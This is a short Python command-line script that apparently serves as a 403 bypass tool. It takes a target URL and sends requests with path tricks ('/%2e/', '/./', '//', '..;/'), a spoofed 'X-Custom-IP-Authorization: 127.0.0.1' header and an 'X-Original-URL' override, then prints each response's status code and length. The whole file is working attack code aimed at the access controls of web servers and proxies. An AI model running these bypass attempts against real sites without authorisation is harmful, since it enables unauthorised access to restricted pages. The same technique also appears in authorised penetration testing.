import requests
import sys

def custom_req(original_url):
	new_url=original_url
	response=requests.get(original_url,
    headers={'X-Custom-IP-Authorization': '127.0.0.1','user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36'}
	)
	print(original_url)
	print("Status Code:",response.status_code)
	print("Content-Length:",len(response.content))
	print("-------------------------------------------")
	new_url=new_url.split("/")
	size=len(new_url)
	last_element=new_url[size-1]
	new_url.pop()
	d="/"
	random="/anything"
	new_url=d.join(new_url)
	new_url=new_url+random
	response2=requests.get(new_url,
    headers={'x-original-url': last_element,'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36'}
	)
	print(new_url)
	print("Status Code:",response2.status_code)
	print("Content-Length:",len(response2.content))


def split(original_url):
	new_url=original_url
	new_url=new_url.split("/")
	size=len(new_url)
	last_element=new_url[size-1]
	new_url.pop()
	d="/"
	new_url=d.join(new_url)
	payload=new_url+"/%2e"+"/"+last_element
	payload2=new_url+"/./"+last_element+"/"+"./"
	req(payload)
	req(payload2)

def enc(url):
	new_url=url+"/"
	new_url2=url+"/."
	new_url3=url+"//"
	new_url4=url+"..;/"
	req(new_url)
	req(new_url2)
	req(new_url3)
	req(new_url4)

def req(final_url):
	print(final_url)
	response=requests.get(final_url,
	headers={'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36'}
	)
	print("status Code:",response.status_code)
	print("Content-Length",len(response.content))
	print("-------------------------------------------")
arg=sys.argv
url=arg[2]
if arg[1]=="-u":
	print("Intiating Requests")
	enc(url)
	split(url)
	custom_req(url)
else:
	print("Wrong Argument")
